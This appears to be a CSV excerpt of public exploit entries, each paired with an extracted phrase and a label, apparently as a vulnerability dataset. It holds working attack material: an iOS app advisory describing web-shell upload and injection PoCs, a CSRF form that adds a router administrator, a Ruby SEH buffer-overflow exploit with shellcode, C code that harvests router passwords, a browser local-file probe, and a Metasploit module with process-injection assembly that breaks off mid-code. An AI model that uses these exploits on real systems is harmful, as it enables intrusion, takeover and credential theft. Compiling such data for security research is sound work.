30031,"Imagam iFiles 1.16.0 iOS - Multiple Web Vulnerabilities Document Title: =============== Imagam iFiles v1.16.0 iOS - Multiple Web Vulnerabilities   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1160   Release Date: ============= 2013-12-03   Vulnerability Laboratory ID (VL-ID): ==================================== 1160   Common Vulnerability Scoring System: ==================================== 8.9   Product & Service Introduction: =============================== iFiles is the most intuitive file manager for iOS with features like connectivity to many file cloud services,  transferring files between computer or cloud services, ability to view many file formats (PDF viewer now  supports annotations, search and more), voice recorder, web downloader, text file editor and more.  Supported Online Cloud Services and Protocols: Dropbox, Google Drive, iCloud, Box.net, SkyDrive, SugarSync, AFP  (Mac Shares), FTP/FTPS, SFTP, Flickr, Picasa, Facebook, Rackspace CloudFiles, CloudApp, PogoPlug, WebDav, Amazon  S3, Ubuntu One Files, ownCloud, 4Shared, also using Amazon S3: DreamObjects and UltiCloud.  ( Copy of the Homepage: https://itunes.apple.com/de/app/ifiles/id336683524 & http://imagam.com )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research Team discovered multiple vulnerabilities in the official Imagam iFiles v1.16.0 mobile application for apple iOS.   Vulnerability Disclosure Timeline: ================================== 2013-12-03:    Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Imagam Product: iFiles - Mobile Application iOS 1.16.0   Exploitation Technique: ======================= Remote   Severity Level: =============== Critical   Technical Details & Description: ================================ 1.1 A file include- & arbitrary file upload web vulnerability has been discovered in the official Imagam iFiles v1.16.0 mobile application for apple iOS. An arbitrary file upload issue allows a remote attacker to upload files with multiple extensions to bypass the validation for unauthorized access. A file include web vulnerability allows a remote attacker to unauthorized include local web-server file requests or external file requests.   The vulnerability is located in the vulnerable file- and folder-name value. Remote attackers can include local file requests combined with script code  to successful exploit the issue. To include to the vulnerable foldername value it is required to manipulate the `create folder` (add) input (POST Method). The secound possibility to inject is the vulnerable filename value of the misconfigured (POST Method) upload module. After the include the remote attacker  can access the included file by requesting the regular index or sub category folder (web interface) site.  The arbitrary file upload vulnerability is located in the vulnerable filename value of the upload module. Attackers are also able to upload a php or js  web-shells by renaming the file with multiple extensions. The attacker uploads for example a web-shell with the following name and extension  test.jpg.html.js.php.gif.jpg . After the upload the attacker opens the file in the web application to delete the .gif.jpg file extension to access the  resource with elevated execution access rights.  Exploitation of the file include & arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password. Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.  Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] File Upload  Vulnerable Parameter(s): 				[+] filename (value) - (multiple extensions) 				[+] foldername  Affected Module(s): 				[+] File & Folder Dir Listing (http://localhost:8080)    1.2 2 local command/path injection web vulnerabilities has been discovered in the official Imagam iFiles v1.16.0 mobile application for apple iOS. The remote web vulnerability allows to inject local commands via vulnerable system values to compromise the apple mobile iOS application.  The vulnerability is located in the in the device name value of the file dir und sub category listing module. Local attackers are able to inject  own malicious system specific commands or path values requests as the iOS device name. The execute of the injected script code occurs in two  different section with persistent attack vector. The first section is the wifi app web-interface index file/folder dir listing. The secound  execute occurs in the file/folder sub category listing. The security risk of the local command/path inject vulnerability is estimated as high(-)  with a cvss (common vulnerability scoring system) count of 6.2(+)|(-)6.3.  Exploitation of the command/path inject vulnerability requires a low privileged iOS device account with restricted access and no user interaction.  Successful exploitation of the vulnerability results in unauthorized execute of system specific commands or unauthorized path requests.   Request Method(s): 				[+] POST to GET  Vulnerable Parameter(s): 				[+] devicename  Affected Module(s): 				[+] Index- File Dir Listing 				[+] Sub Folder/Category - File Dir Listing   Proof of Concept (PoC): ======================= 1.1 The file include and arbitrary file upload web vulnerability can be exploited by remote attackers without privileged web application  user account and also without user interaction. For security demonstration or to reproduce the vulnerability follow the provided  information and steps below.  PoC: foldername  <div id=""headerHighlight""> 		<div id=""header""> 		 			<div class=""logo""> <img src=""_device%20folder&path-issue-1_files/icon57.png"" alt=""icon57"" height=""57"" width=""57""> 				<h1>iFiles</h1>   			</div>   			<div class=""deviceName""> 				<h4>device bkm337� </h4> 	  		</div> 	  		  <div class=""urlDiv"">      				<div class=""outer"">       				  <div class=""inner""> <b>/>""<[FILE INCLUDE WEB VULNERABILITY!]%22""_device%20folder&[FILE INCLUDE WEB VULNERABILITY!]%22"">x.com/</b> 		</div>     		</div>    		</div> 	</div> 	</div> </div>   PoC: filename (value)  <tr id=""sfile0"" url=""/"" filename=""<EMBED SRC="" data:image""=""""> <td class=""fileName""> <a href=""http://192.168.2.106:8080/%3CEMBED%20SRC="" data:image""=""""><img class=""fileIcon""  src=""_device%20folder&path-issue-2_files/FolderIcon.png"" alt=""*""> <embed src=""data:image%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%09%3C/ a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%3C/td%3E%0A%20%20%20%20 %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%09%09%3Ctd%20class="" filelastmod""="""">Mon, 02 Dec 2013 15:50:10 GMT</a></td>                     <td class=""fileSize"" align=""right"">--                      <img style=""display:none;"" class=""downloadIcon"" src=""_device%20folder&path-issue-2_files/downloadIcon.png""  alt=""d"" onclick=""downloadFile('/<EMBED SRC="" data:image');""=""""> <img class=""deleteIcon"" src=""_device%20folder&path-issue-2_files/deleteIcon.png"" alt=""x""  title=""Delete this file"" onclick=""deleteFile('#sfile0');"" =""cursor:pointer;""="""">                     			</td>                 			</tr> <tr id=""sfile1"" url=""/"" filename=""[FILE INCLUDE WEB VULNERABILITY!]%22""> <td class=""fileName""> <a href=""http://192.168.2.106:8080/%3E"" <[FILE INCLUDE WEB VULNERABILITY!]%22""><img class=""fileIcon""  src=""_device%20folder&path-issue-2_files/FolderIcon.png"" alt=""*""> >""<[FILE INCLUDE WEB VULNERABILITY!]=""_device%20folder&path-issue-2_files/a.htm"" <="""" a=""""> </td>   1.2 The local command inject web vulnerability can be exploited by remote attackers with low privileged or restricted iOS device user account  and no user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below.  PoC: devicename  <div id=""headerHighlight""> 		<div id=""header""> 		 			<div class=""logo""> 				<img src=""device%20name__files/icon57.png"" alt=""icon57"" height=""57"" width=""57""> 				<h1>iFiles</h1>   			</div>   			<div class=""deviceName""> 				<h4>d4vice><..[COMMAND/PATH INJECT VULNERABILITY!] </h4> 	  		</div> 	  		  <div class=""urlDiv"">      				<div class=""outer"">       				  <div class=""inner"">           			  <b>/</b>        				 </div>     			 </div>    			 </div> 		</div> 		</div>   Solution - Fix & Patch: ======================= 1.1 The file include vulnerability and arbitrary file upload vulnerability can be patched by a secure parse and encode of the vulnerable  filename and foldername values. Encode also the vulnerable path sub category file dir listing and the index file dir listing. Recognize the path value.  1.2 To patch the local command inject web vulnerability it is required to encode the deviename value in the index and sub category sites  to prevent injects or requests.   Security Risk: ============== 1.1 The security risk of the file include and arbitrary file upload (restricted upload bypass) web vulnerability is estimated as critical.  1.2 The security risk of the local command/path inject web vulnerability is estimated as high(-).   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright � 2013 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com",inject own malicious system specific commands or path values requests as the iOS device name,1
45252,"Vox TG790 ADSL Router - Cross-Site Request Forgery (Add Admin) # Title: Vox TG790 ADSL Router - Cross-Site Request Forgery (Add Admin) # Author: Cakes # Exploit Date: 2018-08-01 # Vendor: Vox Telecom # Link: https://www.vox.co.za/ # Firmware Version: 6.2.W.1 # CVE: N/A  # Description # Due to improper session management low privilege users are able to create  # administrator accounts through a crafted POST request.   # PoC  <html> <form action=""https://TARGET/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9&tid=ADD_USER"" method=""POST""> <input type=""hidden"" name=""0"" id=""0"" value=""10""> <input type=""hidden"" name=""1"" id=""1"" value=""usrAccApply""> <input type=""hidden"" name=""34"" id=""34"" value=""LulzCakes""> <input type=""hidden"" name=""36"" id=""36"" value=""1""> <input type=""text"" name=""33"" id=""33"" placeholder=""Account Name""> <br /> <input type=""text"" name=""31"" id=""31"" value=""Administrator""> <br /> <input type=""submit"" value=""W00ts""> </form> </html>",a crafted POST request,1
12261,"Archive Searcher - '.zip' Local Stack Overflow #!/usr/bin/ruby # Software      : Archive Searcher 2.1 # Author        : Lincoln # OS            : Windows # Tested on     : XP SP3 En (VirtualBox) # Type of vuln  : SEH # Greetz to     : Corelan Security Team # http://www.corelan.be:8800/index.php/security/corelan-team-members/ # # Script provided 'as is', without any warranty. # Use for educational purposes only. # Do not use this code to do anything illegal ! # # Note : you are not allowed to edit/modify this code. # If you do, Corelan cannot be held responsible for any damages this may cause. # # # Search for file in application, ex: point to desktop and click seach now # Character restrictions, upper case alpha converted, A -> a etc. # # banner = ""|------------------------------------------------------------------|\n"" + ""|                         __               __                      |\n"" + ""|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n"" + ""|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n"" + ""| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n"" + ""| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n"" + ""|                                                                  |\n"" + ""|                                       http://www.corelan.be:8800 |\n"" + ""|                                                                  |\n"" + ""|-------------------------------------------------[ EIP Hunters ]--|\n\n""  print banner puts ""[+] Exploit for Archive Searcher 2.1""  #Zip Headers header1= ""\x50\x4b\x03\x04\x14\x00\x00\x00"" + ""\x00\x00\xb7\xac\xce\x34\x00\x00"" + ""\x00\x00\x00\x00\x00\x00\x00\x00"" + ""\x00\xe4\x0f\x00\x00\x00""  header2= ""\x50\x4b\x01\x02\x14\x00\x14\x00"" + ""\x00\x00\x00\x00\xb7\xac\xce\x34"" + ""\x00\x00\x00\x00\x00\x00\x00\x00"" + ""\x00\x00\x00\x00\xe4\x0f\x00\x00"" + ""\x00\x00\x00\x00\x01\x00\x24\x00"" + ""\x00\x00\x00\x00\x00\x00""  header3= ""\x50\x4B\x05\x06\x00\x00\x00\x00"" + ""\x01\x00\x01\x00\x12\x10\x00\x00"" + ""\x02\x10\x00\x00\x00\x00""  #Align regs # jmp esi # jmp to egg align= ""\x90\x90\xeb\x3b\x90\x90\x90\x61"" + ""\x61\x61\x61\x61\x61\x61\x61\x61"" + ""\x61\x61\x61\x61\x61\x61\x61\x61"" + ""\x61\x61\x61\x61\x61\x61\x61\x61"" + ""\x61\x61\x61\x61\x61\x61\x61\x61"" + ""\x61\x61\x61\x61\x61\x61\x61\x61"" + ""\x61\x61\x61\x61\x61\x61\x61\x61"" + ""\x5e\x5e\x5e\x5e\x5e\xff\xe6""  #modified egghunter, mov edx,esi  egg = ""\x89\xf2\x42\x52\x6a\x02\x58\xcd"" + ""\x2e\x3c\x05\x5a\x74\xef\xb8\x77"" + ""\x30\x30\x74\x8B\xfa\xaf\x75\xea"" + ""\xaf\x75\xe7\xff\xe7""   #msgbox: ""Exploited by Corelan Security Team"" shellcode = ""w00tw00t"" + ""\x89\xe3\xda\xd7\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x49"" + ""\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a"" + ""\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41"" + ""\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"" + ""\x75\x4a\x49\x4a\x79\x4a\x4b\x4d\x4b\x4b\x69\x51\x64\x45"" + ""\x74\x4a\x54\x45\x61\x4e\x32\x4e\x52\x42\x5a\x46\x51\x49"" + ""\x59\x42\x44\x4e\x6b\x51\x61\x44\x70\x4c\x4b\x43\x46\x44"" + ""\x4c\x4e\x6b\x42\x56\x47\x6c\x4c\x4b\x51\x56\x44\x48\x4c"" + ""\x4b\x51\x6e\x45\x70\x4e\x6b\x45\x66\x50\x38\x50\x4f\x47"" + ""\x68\x50\x75\x4c\x33\x50\x59\x45\x51\x4b\x61\x4b\x4f\x48"" + ""\x61\x51\x70\x4c\x4b\x50\x6c\x46\x44\x45\x74\x4c\x4b\x51"" + ""\x55\x47\x4c\x4c\x4b\x50\x54\x43\x35\x50\x78\x43\x31\x4b"" + ""\x5a\x4c\x4b\x42\x6a\x47\x68\x4e\x6b\x43\x6a\x47\x50\x45"" + ""\x51\x4a\x4b\x48\x63\x46\x57\x50\x49\x4e\x6b\x44\x74\x4c"" + ""\x4b\x45\x51\x4a\x4e\x44\x71\x49\x6f\x50\x31\x4b\x70\x4b"" + ""\x4c\x4e\x4c\x4f\x74\x4b\x70\x43\x44\x46\x6a\x4a\x61\x4a"" + ""\x6f\x44\x4d\x47\x71\x4b\x77\x48\x69\x4a\x51\x4b\x4f\x49"" + ""\x6f\x49\x6f\x45\x6b\x43\x4c\x45\x74\x51\x38\x51\x65\x49"" + ""\x4e\x4e\x6b\x42\x7a\x45\x74\x45\x51\x4a\x4b\x43\x56\x4e"" + ""\x6b\x46\x6c\x42\x6b\x4c\x4b\x43\x6a\x45\x4c\x43\x31\x4a"" + ""\x4b\x4e\x6b\x45\x54\x4e\x6b\x47\x71\x4d\x38\x4f\x79\x51"" + ""\x54\x46\x44\x47\x6c\x45\x31\x4a\x63\x4f\x42\x44\x48\x46"" + ""\x49\x48\x54\x4f\x79\x4b\x55\x4d\x59\x49\x52\x50\x68\x4c"" + ""\x4e\x50\x4e\x44\x4e\x48\x6c\x50\x52\x4b\x58\x4d\x4c\x4b"" + ""\x4f\x49\x6f\x4b\x4f\x4f\x79\x51\x55\x46\x64\x4d\x6b\x51"" + ""\x6e\x49\x48\x4d\x32\x51\x63\x4c\x47\x45\x4c\x44\x64\x51"" + ""\x42\x4d\x38\x4e\x6b\x49\x6f\x49\x6f\x4b\x4f\x4c\x49\x42"" + ""\x65\x47\x78\x43\x58\x42\x4c\x50\x6c\x45\x70\x4b\x4f\x51"" + ""\x78\x47\x43\x45\x62\x46\x4e\x45\x34\x45\x38\x51\x65\x51"" + ""\x63\x45\x35\x44\x32\x4d\x58\x51\x4c\x44\x64\x44\x4a\x4c"" + ""\x49\x48\x66\x43\x66\x4b\x4f\x43\x65\x46\x64\x4c\x49\x4b"" + ""\x72\x50\x50\x4d\x6b\x4e\x48\x4c\x62\x50\x4d\x4d\x6c\x4e"" + ""\x67\x47\x6c\x47\x54\x46\x32\x4b\x58\x43\x6e\x49\x6f\x49"" + ""\x6f\x49\x6f\x42\x48\x51\x74\x45\x71\x51\x48\x45\x70\x43"" + ""\x58\x44\x30\x43\x47\x42\x4e\x42\x45\x44\x71\x4b\x6b\x4b"" + ""\x38\x43\x6c\x45\x74\x46\x66\x4b\x39\x48\x63\x45\x38\x50"" + ""\x61\x42\x4d\x50\x58\x45\x70\x51\x78\x42\x59\x45\x70\x50"" + ""\x54\x51\x75\x51\x78\x44\x35\x43\x42\x50\x69\x51\x64\x43"" + ""\x58\x51\x30\x43\x63\x45\x35\x43\x53\x51\x78\x42\x45\x42"" + ""\x4c\x50\x61\x50\x6e\x42\x48\x51\x30\x51\x53\x50\x6f\x50"" + ""\x72\x45\x38\x43\x54\x51\x30\x50\x62\x43\x49\x51\x78\x42"" + ""\x4f\x43\x59\x42\x54\x50\x65\x51\x78\x42\x65\x51\x68\x42"" + ""\x50\x50\x6c\x46\x51\x48\x49\x4e\x68\x50\x4c\x46\x44\x45"" + ""\x72\x4d\x59\x49\x71\x44\x71\x4a\x72\x43\x62\x43\x63\x50"" + ""\x51\x46\x32\x4b\x4f\x48\x50\x50\x31\x4f\x30\x46\x30\x4b"" + ""\x4f\x51\x45\x44\x48\x45\x5a\x41\x41""  size = 4064 junk = ""\x90"" * (267 - (align.length + egg.length))  jseh = ""\xe9\xf7\xfe\xff\xff"" #jmp back to popad's nseh = ""\xeb\xf9\x90\x90"" #jmp back to near jump seh  = ""\x0c\x14\x40\x00"" #universal  payload = align + egg + junk + jseh + nseh + seh + shellcode rest = ""D"" * (size - payload.length) final = payload + rest + "".txt""  filename = ""search.zip"" f = File.new(filename, 'w') f.write header1 + final + header2 + final + header3 f.close  puts ""[+] file size :  #{final.length}"" puts ""[+] Wrote exploit file : #{filename}"" puts ""[+] Search for zip and boom!\n\n""",a specially crafted .zip file,1
21513,"Telindus 1100 Series Router - Administration Password Leak // source: https://www.securityfocus.com/bid/4946/info  The 1100 series routers are a broadband connectivity solution distributed by Telindus.  Under some circumstances, a vulnerable Telindus router may leak sensitive information. When an attempt to connect to the router is made using the administrative software, the router sends the password to the client in plain text. This packet is sent via UDP.  **The vendor has released firmware version 6.0.27, dated July 2002. Reports suggest that this firmware does not adequately protect against this vulnerability. The firmware is reported to use an encrypted UDP packet when connecting to the router. However, the firmware uses a weak encryption scheme and thus it is easily circumvented by an attacker.   this is a really-stupid bad-written exploit for telindus router (10xx and 11xx series) bye, rubik@olografix.org  /* telozarzo.c */  #include<sys/types.h> #include<sys/socket.h> #include<netinet/in.h> #include<netinet/udp.h> #include<arpa/inet.h> #include<sys/time.h> #include<string.h> #include<stdio.h> #include<signal.h> #include<unistd.h> #include<stdlib.h>  #define BUFFER_SIZE 300  struct sockaddr sa; struct sockaddr sf; struct sockaddr *from; struct sockaddr_in *p, *d; int len; int fd; int sent,recvd; unsigned long start_ip;  char pass[32]; char str[10]; FILE *logfile;  struct timeval minutetimeout; int TIMEOUT;  int numhost=0, numfound=0; double per;  u_char data2recv[BUFFER_SIZE]; u_char data2sent[62]={ 		0x19, 0x73, 0x04, 0x17, 0x73, 0x30, 0x00, 0x01, 		0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02, 		0x01, 0x33, 0x01, 0x13, 0x01, 0x16, 0x04, 0x08, 		0x04, 0x15, 0x01, 0x0D, 0x01, 0x0E, 0x01, 0x14, 		0x40, 0x03, 0x40, 0x04, 0x01, 0x26, 0x01, 0x27, 		0x01, 0x28, 0x01, 0x30, 0x01, 0x44, 0x42, 0x05, 		0x42, 0x22, 0x04, 0x18, 0xFF, 0xFF, 0x00, 0x00, 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00 		};  void func_alarm_telindus (int s) { 	close(fd); 	return; }  void exitnow () { 	close(fd); 	exit(2); }  int checktelindus (unsigned long ip) {  	int i=0; 	char *s;  	p=(struct sockaddr_in*)&sa; 	p->sin_family=AF_INET; 	p->sin_port=htons(9833); 	p->sin_addr.s_addr= htonl(ip);  	d=(struct sockaddr_in*)&sf; 	d->sin_family=AF_INET; 	d->sin_port=htons(9833); 	d->sin_addr.s_addr=INADDR_ANY;  	minutetimeout.tv_sec = TIMEOUT; 	minutetimeout.tv_usec = 0;  	bzero (data2recv, sizeof (data2recv));  	fd=socket(AF_INET,SOCK_DGRAM,0);  	bind (fd, (struct sockaddr*)d, sizeof (struct sockaddr)); 	sent=sendto(fd,&data2sent,62,0,(struct sockaddr*)p,sizeof(struct sockaddr));  	signal(SIGALRM, func_alarm_telindus); 	alarm(TIMEOUT);  	if (recvfrom(fd,data2recv,BUFFER_SIZE,0,from,&len)<=0) { 		alarm(0); 		signal(SIGALRM,SIG_DFL); 		bzero (data2recv, sizeof (data2recv)); 		return(-1); 	}  	s=data2recv; 	while (i<5) { 		while ((*(s++)) != '\0');  i++; 	}  	if (*s == '\0') { 		printf (""pw vuota\n""); 	} else { 		strncpy (pass, ++s, strlen(s) -3 ); 		printf (""pw: = %s \n"", pass); 	} 	alarm(0); 	signal(SIGALRM,SIG_DFL); 	return (0); }   void usage (char *cmd) { 	printf (""\n%s ip\n"", cmd); 	exit(1); }  int main(int argc, char *argv[]) {  	if (argc != 2) usage(argv[0]); 	start_ip=inet_addr(argv[1]);  	signal(SIGINT, exitnow); 	signal(SIGTERM, exitnow); 	signal(SIGKILL, exitnow); 	signal(SIGQUIT, exitnow);  	checktelindus (ntohl(start_ip));  	return (0); }",the router sends the password to the client in plain text,1
24728,"Microsoft Internet Explorer 6.0 / Firefox 0.x / Netscape 7.x - IMG Tag Multiple Vulnerabilities source: https://www.securityfocus.com/bid/11645/info  Various browsers are reported prone to multiple vulnerabilities in the image handling functionality through the <IMG> tag. These issues can allow remote attackers to determine the existence of local files, cause a denial of service condition, and disclose passwords for Windows systems via file shares.  Mozilla Firefox 0.10.1 and prior versions are reported vulnerable to these issues. It is alleged that Microsoft Internet Explorer and Netscape Browsers are also vulnerable to these issues. Due to this vulnerable packages for Internet Explorer and Netscape have been added. This BID will be updated as more information becomes available.  <img src=""file:///c|/nonexistent/content.gif""> <img src=""file:///c|/windows/content.gif"">  <script> onload =function(){ incl=(document.images[0].width!=document.images[1].width)? """" :""not ""; alert(""Windows is ""+ incl +""installed in C:/WINDOWS/""); } </script>","determine the existence of local files, cause a denial of service condition, and disclose passwords for Windows systems via file shares",1
17543,"Iconics GENESIS32 9.21.201.01 - Integer Overflow (Metasploit) ## # $Id: iconics_genbroker.rb 13197 2011-07-17 15:01:46Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Egghunter  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Iconics GENESIS32 Integer overflow version 9.21.201.01"", 			'Description'    => %q{ 					The GenBroker service on port 38080 is affected by three integer overflow 				vulnerabilities while handling opcode 0x4b0, which is caused by abusing the 				the memory allocations needed for the number of elements passed by the client. 				This results unexpected behaviors such as direct registry calls, memory location 				calls, or arbitrary remote code execution.  Please note that in order to ensure 				reliability, this exploit will try to open calc (hidden), inject itself into the 				process, and then open up a shell session.  Also, DEP bypass is supported. 			}, 			'License'        => MSF_LICENSE, 			'Version'        => ""$Revision: 13197 $"", 			'Author'         => 				[ 					'Luigi Auriemma', #Initial discovery, poc 					'Lincoln',        #Metasploit 					'corelanc0d3r',   #Metasploit + custom migrate fu 				], 			'References'     => 				[ 					['URL', 'http://aluigi.org/adv/genesis_4-adv.txt'], 				], 			'Payload'        => 				{ 					'BadChars' => ""\x00"", 				}, 			'DefaultOptions'  => 				{ 					'ExitFunction' => ""thread"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'Windows XP', 						{ 							'Ret' => ""\x70\x45"", 							'Max' => 9000, 						} 					], 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Mar 21 2011"", 			'DefaultTarget'  => 0))  			register_options( 				[ 					Opt::RPORT(38080) 				], self.class) 	end  	def exploit  		migrate_asm = %Q| add esp,-500                  ; adjust the stack to be sure pushad                        ; save stuff  find_kernel32:                ;find kernel32 push esi                      ; Save esi xor  esi, esi                 ; Zero esi mov  eax, fs:[esi + 0x4]      ; Extract TEB mov  eax, [eax - 0x1c] find_kernel32_base: find_kernel32_base_loop: dec  eax                      ; Subtract to our next page xor  ax, ax                   ; Zero the lower half cmp  word [eax], 0x5a4d       ; Is this the top of kernel32? jne  find_kernel32_base_loop  ; Nope?  Try again. find_kernel32_base_finished: pop  esi                      ; Restore esi  mov edx,eax                   ; save base of kernel32 in edx  jmp main_routine  ; find function pointer find_function: pushad                        ;save all registers mov ebp, [esp + 0x24]         ;base address of module that is being loaded in ebp mov eax, [ebp + 0x3c]         ;skip over MSDOS header mov edx, [ebp + eax + 0x78]   ;go to export table and put RVA in edx add edx, ebp                  ;add base address to it. mov ecx, [edx + 0x18]         ;set up counter ECX (how many exported items are in array ?)  mov ebx, [edx + 0x20]         ;put names table relative offset in ebx add ebx, ebp                  ;add base address to it (ebx = absolute address of names table)  ;(should never happen) ;unless function could not be found find_function_loop: jecxz find_function_finished  ;if ecx=0, then last symbol has been checked.  dec ecx                       ;ecx=ecx-1 ;with the current symbol ;and store offset in esi mov esi, [ebx + ecx * 4]      ;get relative offset of the name associated add esi, ebp                  ;add base address (esi = absolute address of current symbol)  compute_hash: xor edi, edi                  ;zero out edi xor eax, eax                  ;zero out eax cld                           ;clear direction flag.  compute_hash_again: lodsb                         ;load bytes at esi (current symbol name) into al, + increment esi test al, al                   ;end of string ? jz compute_hash_finished      ;yes ror edi, 0xd                  ;no, rotate value of hash 13 bits to the right add edi, eax                  ;add current character of symbol name to hash accumulator jmp compute_hash_again        ;continue loop  compute_hash_finished:  find_function_compare: cmp edi, [esp + 0x28]         ;see if computed hash matches requested hash (at esp+0x28) jnz find_function_loop        ;no match, go to next symbol mov ebx, [edx + 0x24]         ;if match : extract ordinals table (relative offset and put in ebx) add ebx, ebp                  ;add base address (ebx = absolute address of ordinals address table) mov  cx, [ebx + 2 * ecx]      ;get current symbol ordinal number (2 bytes) mov ebx, [edx  +  0x1c]       ;get address table relative and put in ebx add ebx, ebp                  ;add base address (ebx = absolute address of address table) mov eax, [ebx + 4 * ecx]      ;get relative function offset from its ordinal and put in eax add eax, ebp                  ;add base address (eax = absolute address of function address) mov [esp + 0x1c], eax         ;overwrite stack copy of eax so popad (return func addr in eax)  find_function_finished:       ;retrieve original registers (eax will contain function address) popad ret   ;-------------------------------------------------------------------------------------- find_funcs_for_dll: lodsd                         ;load current hash into eax (pointed to by esi) push eax                      ;push hash to stack push edx                      ;push base address of dll to stack call find_function mov [edi], eax                ;write function pointer into address at edi add esp, 0x08                 ;adjust stack add edi, 0x04                 ;increase edi to store next pointer cmp esi, ecx                  ;did we process all hashes yet ? jne find_funcs_for_dll        ;get next hash and lookup function pointer find_funcs_for_dll_finished: ret  ;-------------------------------------------------------------------------------------- main_routine: sub esp,0x1c                  ;allocate space on stack to store function addresses + ptr to string mov ebp,esp ; ebp+4	 : GetStartupInfo ; ebp+8  : CreateProcess ; ebp+C  : VirtualAllocEx ; ebp+10 : WriteProcessMemory ; ebp+14 : CreateRemoteThread ; ebp+18 : Sleep ; ebp+1c : ptr to calc  jmp get_func_hash get_func_hash_return:  pop esi                       ;get pointer to hashes into esi ;edi will be increased with 0x04 for each hash lea edi, [ebp+0x4]            ;we will store the function addresses at edi  mov ecx,esi add ecx,0x18 call find_funcs_for_dll       ;get function pointers for all hashes  ; get our own startupinfo at esp+0x60 ; ebp+4 = GetStartupInfo mov edx,esp add edx,0x60 push edx call [ebp+0x4] ;ptr to startupinfo is in eax  ; create a new process ; pointer to string is in ecx ; ebp+8 = CreateProcessA ; ptr to startupinfo is now in eax ; no need to patch startupinfo, target runs as a service ; +2c : dwFlags : set to 0x1 ; +30 : wShowWind : set to 0 (hide)  ; create the process mov edi,eax add edi,48 push edi                      ; lpProcessInformation : write processinfo here push eax                      ; lpStartupInfo : current info (read) push 0                        ; lpCurrentDirectory push 0                        ; lpEnvironment push 0x08000000               ; dwCreationFlags push 0                        ; bInHeritHandles push 0 push 0 push esi                      ; ptr to calc push 0 call [ebp+0x8] ; muahah calc ftw, now sleep a bit push 0xbb8                    ; 3 seconds call [ebp+0x18]  ; allocate memory in the process (VirtualAllocEx()) ; get handle mov ecx,[edi] push 0x40                     ; RWX push 0x1000                   ; MEM_COMMIT push 0x1000                   ; size push 0                        ; address push ecx                      ; handle call [ebp+0xc]  ; eax now contains the destination ; WriteProcessMemory() mov ecx,[edi]                 ; pick up handle again push 0x1000                   ; size ; pick up pointer to shellcode & push to stack mov ebx,[esp+0x20] add ebx,320 push ebx                      ; source push eax                      ; destination push ecx                      ; handle call [ebp+0x10]  ; run the code (CreateRemoteThread()) mov ecx,[edi]                 ; pick up handle again push 0                        ; lpthreadID push 0                        ; run immediately push 0                        ; no parameter mov ebx,[esp-0x4] push ebx                      ; shellcode push 0x2000                   ; stacksize push 0                        ; lpThreadAttributes push ecx call [ebp+0x14]               ; go baby !   get_func_hash: call get_func_hash_return db 0xD7                       ;GetStartupInfoA db 0xE3 db 0x7A db 0x86 db 0x72                       ;CreateProcessA db 0xfe db 0xb3 db 0x16 db 0x9c                       